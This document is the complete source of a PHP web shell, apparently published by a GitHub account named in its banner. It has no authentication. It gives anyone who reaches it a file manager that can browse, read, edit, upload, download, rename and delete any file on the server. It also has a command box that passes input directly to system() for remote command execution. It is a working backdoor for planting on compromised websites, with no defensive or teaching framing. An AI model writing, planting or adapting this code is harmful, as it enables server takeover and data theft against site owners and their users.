<?php
// ================== DEBUG MODE ==================
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
ob_start();
register_shutdown_function(function () {
    $err = error_get_last();
    if ($err !== null) {
        echo "<pre style='color:red'>PHP Fatal: {$err['message']} in {$err['file']} on line {$err['line']}</pre>";
    }
});

// ================== SESSION ==================
session_start();
if (!isset($_SESSION['visited'])) $_SESSION['visited'] = [];

// fungsi untuk mark visited
function markVisited($path) {
    $_SESSION['visited'][$path] = true;
}
function isVisited($path) {
    return isset($_SESSION['visited'][$path]);
}

// ================== HTML HEADER ==================
echo "<!DOCTYPE html>
<html>
<head>
    <title></title>
    <style>
        body { background-color: #0b0b0b; color: #eee; font-family: monospace; padding: 12px; }
        a { text-decoration: none; }
        .cyan { color: cyan; }
        .white { color: white; }
        .yellow { color: yellow; }
        input, textarea, select { background: #111; color: #c7ffb2; border: 1px solid #333; font-family: monospace; }
        table { border-collapse: collapse; width: 100%; color: #fff; margin-top:8px; }
        th, td { border: 1px solid #444; padding: 6px; text-align: left; vertical-align: top; }
        fieldset { margin-bottom: 12px; border:1px solid #333; padding:8px; }
        legend { padding:0 6px; }
        .msg { margin:8px 0; }
        pre { font-size: 14px; }
        .cmd-section { margin-top: 20px; }
        .cmd-form { display: flex; gap: 10px; align-items: center; margin-bottom: 10px; }
        .cmd-form input[type='text'] { flex: 1; padding: 5px; font-family: monospace; font-size: 14px; }
        .cmd-form input[type='submit'] { padding: 5px 10px; }
        textarea { width: 100%; height: 200px; font-family: monospace; font-size: 14px; }
        .banner { color:#66d9ef; margin-bottom:20px; }
    </style>
</head>
<body><pre class='banner'>";

// ================== BANNER ==================
echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢠⣴⣿⣿⣿⣷⣼⣿⠀⣴⠾⠷⠶⠦⡄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⡤⢶⣦⣾⣿⣿⣿⣿⣿⣿⣿⠀⣿⣶⣶⣦⣄⠳⣤⣤⠄⠀⠀⠀
⠀⠀⠀⢀⣼⣳⡿⢻⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣿⣗⠈⠙⠻⣶⣄⡀⠀⠀⠀
⠀⠀⠀⣰⠿⠁⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⠈⠳⣤⠀⠀
⠀⠀⢀⡟⠀⢰⣿⠟⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⠉⠁⠈⠻⣶⣄⠀⠀⠈⠛⢦   www.github.com/caterscam 
⠀⣀⡼⠃⠀⣼⡟⠀⠀⢸⣿⡿⠉⣿⡿⠿⠛⣿⡄⠀⠀⠀⠙⠿⣆⠀⠀⠀⠈
⠈⠁⠀⠀⢸⡟⠀⠀⠀⢸⣿⠀⠀⣿⠁⠀⠀⠈⠃⠀⠀⠀⠀⠀⠘⢷⡄⠀⠀
⠀⠀⠀⠀⣼⠃⠀⠀⠀⢸⡟⠀⠀⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡆⠀
⠀⠀⠀⣠⡏⠀⠀⠀⠀⣼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠻⠃⠀⠀⠀⠀⣻⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ 
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

";

// ================== FILE MANAGER ==================
$cwd = isset($_GET['path']) ? $_GET['path'] : getcwd();
$cwd = realpath($cwd);
if (!$cwd || !file_exists($cwd)) $cwd = getcwd();

// mark cwd visited
markVisited($cwd);

// Handle delete
if (isset($_GET['del'])) {
    $target = $_GET['del'];
    if (is_file($target)) {
        unlink($target) ? print("[+] File deleted\n") : print("[-] Failed to delete file\n");
    } elseif (is_dir($target)) {
        rmdir($target) ? print("[+] Directory deleted\n") : print("[-] Failed to delete directory\n");
    }
}

// Handle rename
if (isset($_GET['rename']) && isset($_POST['newname'])) {
    $old = $_GET['rename'];
    $new = dirname($old) . '/' . $_POST['newname'];
    rename($old, $new) ? print("[+] Renamed successfully\n") : print("[-] Rename failed\n");
}

// Handle edit
if (isset($_GET['edit']) && isset($_POST['content'])) {
    file_put_contents($cwd . '/' . $_GET['edit'], $_POST['content']) ? print("[+] File saved\n") : print("[-] Save failed\n");
}

// Upload
if (isset($_POST["upload"]) && isset($_FILES["up"])) {
    $up = $_FILES["up"];
    move_uploaded_file($up["tmp_name"], $cwd . "/" . $up["name"])
        ? print("[+] Uploaded " . $up["name"] . "\n")
        : print("[-] Upload failed\n");
}

// Breadcrumb (klikable, warnanya sesuai visited)
echo "<span class='white'>Current Dir:</span> ";
$parts = explode(DIRECTORY_SEPARATOR, trim($cwd, DIRECTORY_SEPARATOR));
$build = DIRECTORY_SEPARATOR;
echo "<a href='?path=" . urlencode($build) . "' class='" . (isVisited($build) ? "yellow" : "white") . "'>/</a>";
foreach ($parts as $i => $part) {
    if ($part === "") continue;
    $build .= ($i == 0 ? "" : DIRECTORY_SEPARATOR) . $part;
    $class = isVisited($build) ? "yellow" : "white";
    echo "<a href='?path=" . urlencode($build) . "' class='$class'>" . htmlspecialchars($part) . "</a>/";
}
echo "\n\n";

// File list
$files = @scandir($cwd);
sort($files);

$dirs = [];
$regular_files = [];
foreach ($files as $f) {
    if ($f == "." || $f == "..") continue;
    $full = $cwd . '/' . $f;
    if (is_dir($full)) $dirs[] = $f;
    elseif (is_file($full)) $regular_files[] = $f;
}

foreach ($dirs as $f) {
    $full = $cwd . '/' . $f;
    $visitedClass = isVisited($full) ? "yellow" : "white";
    echo "<span class='cyan'>[DIR]</span> <a class='$visitedClass' href='?path=" . urlencode($full) . "'>$f</a> ";
    echo "[ <a href='?del=" . urlencode($full) . "'>delete</a> | <a href='?rename=" . urlencode($full) . "'>rename</a> ]\n";
}
foreach ($regular_files as $f) {
    $full = $cwd . '/' . $f;
    $visitedClass = isVisited($full) ? "yellow" : "white";
    echo "<span class='cyan'>[FILE]</span> <a class='$visitedClass' href='?path=" . urlencode($cwd) . "&read=" . urlencode($f) . "'>$f</a> ";
    echo "[ <a href='?path=" . urlencode($cwd) . "&edit=" . urlencode($f) . "'>edit</a> | ";
    echo "<a href='?del=" . urlencode($full) . "'>delete</a> | ";
    echo "<a href='?rename=" . urlencode($full) . "'>rename</a> | ";
    echo "<a href='?path=" . urlencode($cwd) . "&download=" . urlencode($f) . "'>download</a> ]\n";
}

// File viewer
if (isset($_GET['read'])) {
    $target = realpath($cwd . '/' . $_GET['read']);
    if (is_file($target)) {
        markVisited($target);
        echo "\n<b>Viewing:</b> " . htmlspecialchars($target) . "\n\n";
        echo htmlspecialchars(file_get_contents($target));
    }
}

// Edit view
if (isset($_GET['edit']) && !isset($_POST['content'])) {
    $file = $cwd . '/' . $_GET['edit'];
    markVisited($file);
    $content = htmlspecialchars(file_get_contents($file));
    echo "<form method='POST'>
    <textarea name='content' rows='20' style='width:100%;'>$content</textarea><br>
    <input type='submit' value='Save'>
    </form>";
}

// Rename view
if (isset($_GET['rename']) && !isset($_POST['newname'])) {
    echo "<form method='POST'>
    Rename to: <input type='text' name='newname'>
    <input type='submit' value='Rename'>
    </form>";
}

// Upload
echo "<br><form method='POST' enctype='multipart/form-data'>
<b>Upload File:</b> <input type='file' name='up'><input type='submit' name='upload' value='Upload'><br>
</form>";

// CMD Section
echo "<div class='cmd-section'>
<form method='POST' class='cmd-form'>
    <label><b>CMD:</b></label>
    <input type='text' name='cmd'>
    <input type='submit' value='Exec'>
</form>";

if (!empty($_POST["cmd"])) {
    echo "<div>
        <b>CMD Output:</b><br>
        <textarea readonly>";
    system($_POST["cmd"]);
    echo "</textarea></div>";
}
echo "</div>";

echo "</pre></body></html>";
?>
